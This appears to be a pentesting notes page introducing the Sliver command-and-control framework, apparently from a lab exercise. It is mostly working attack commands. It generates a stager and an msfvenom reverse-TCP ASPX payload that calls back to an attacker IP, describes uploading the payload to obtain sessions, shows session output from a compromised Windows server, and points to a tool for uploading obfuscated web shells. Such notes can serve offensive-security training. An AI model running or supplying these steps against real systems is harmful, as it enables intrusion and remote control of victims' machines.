---
description: A command and control (C2) server is software tasked to execute commands.
---

# Intro C2 Sliver

### <mark style="color:yellow;">Terminology</mark>

* **Implants**: Binaires/Executables used to preserve entry onto targat, to establish communications between attacker and compromised system.
* **Beacons**: Is the process of the communicating from target to c2 server periodically.
* **Stagers**: Stager is a way loading code onto remote machine, used to load different code.
* **Armory**: A library of precompiled .NET binaries that can be executed on the victim machine

### <mark style="color:yellow;">Session</mark>

Creating a new profile

```sh
profiles new --http 10.10.14.120:8888 --format shellcode zen
```

Create a stage listener

```sh
stage-listener --url tcp://10.10.14.120:4443 --profile zen
```

Start HTTP server

```sh
http -L 10.10.14.120 -l 8888
```

Generate stager

```sh
generate stager --lhost 10.10.14.120 --lport 4443 --format csharp --save staged.txt
```

Generate a msfvenom aspx payload

```sh
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.120 LPORT=4443 -f aspx > sliver.aspx
```

In the .aspx file replace the shellcode start from new byte. After uploading and opening .aspx file you get a session back.

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

Once getting sessions back type use and id

```sh
# Show sessions
[server] sliver > sessions

 ID         Name            Transport   Remote Address         Hostname   Username   Operating System   Locale   Last Message                                  Health  
========== =============== =========== ====================== ========== ========== ================== ======== ============================================= =========
 0fb55977   STANDARD_GOWN   http(s)     10.129.135.124:49702   web01      <err>      windows/amd64      en-US    Tue Jan 21 12:35:56 EST 2025 (2s ago)         [ALIVE] 
 520436a4   STANDARD_GOWN   http(s)     10.129.135.124:49696   web01      <err>      windows/amd64      en-US    Tue Jan 21 12:35:56 EST 2025 (2s ago)         [ALIVE] 

# Use session
[server] sliver > use 0fb55977
[*] Active session STANDARD_GOWN (0fb55977-1d1a-49b6-a38c-3050062a3f2b)
  
# Get info 
[server] sliver (STANDARD_GOWN) > info

        Session ID: 0fb55977-1d1a-49b6-a38c-3050062a3f2b
              Name: STANDARD_GOWN
          Hostname: web01
              UUID: 8e791442-8f32-0734-2206-371cf25d6bb6
          Username: <err>
               UID: <err>
               GID: <err>
               PID: 2668
                OS: windows
           Version: Server 2016 build 17763 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: https://10.10.14.120:8888
    Remote Address: 10.129.135.124:49702
         Proxy URL: 
Reconnect Interval: 1m0s
     First Contact: Tue Jan 21 12:34:21 EST 2025 (2m8s ago)
      Last Checkin: Tue Jan 21 12:36:27 EST 2025 (2s ago)
```

{% hint style="info" %}
Use [SharpyShell](https://github.com/antonioCoco/SharPyShell) to upload obfuscated web shells.
{% endhint %}
